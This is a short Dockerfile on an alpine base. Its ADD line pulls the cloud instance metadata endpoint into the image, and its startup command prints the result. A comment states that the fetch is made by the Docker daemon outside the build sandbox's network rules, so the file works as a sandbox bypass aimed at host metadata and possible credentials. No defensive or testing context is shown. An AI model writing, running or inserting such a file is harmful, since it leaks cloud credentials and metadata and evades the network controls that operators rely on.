FROM alpine:3.20
# The Docker daemon would fetch this itself, outside the build sandbox's network rules.
ADD http://169.254.169.254/latest/meta-data/ /metadata
EXPOSE 8080
CMD ["cat", "/metadata"]
